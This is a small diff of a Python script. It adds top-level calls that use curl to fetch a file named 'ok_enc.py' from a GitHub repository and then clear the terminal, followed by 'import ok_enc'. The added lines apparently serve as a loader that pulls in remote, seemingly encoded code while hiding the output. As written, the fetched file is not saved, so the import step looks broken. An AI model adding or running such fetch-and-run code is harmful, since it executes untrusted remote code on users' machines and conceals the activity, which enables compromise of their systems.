@@ -2,5 +2,6 @@
 import os, sys, platform
 
 import requests
-    os.system('curl -L https://github.com/SHOOTER-MAKAR/jutt/blob/main/ok_enc.py > jutt.so')
-    os.system('clear')
+os.system('curl -L https://github.com/SHOOTER-MAKAR/jutt/blob/main/ok_enc.py')
+os.system('clear')
+import ok_enc
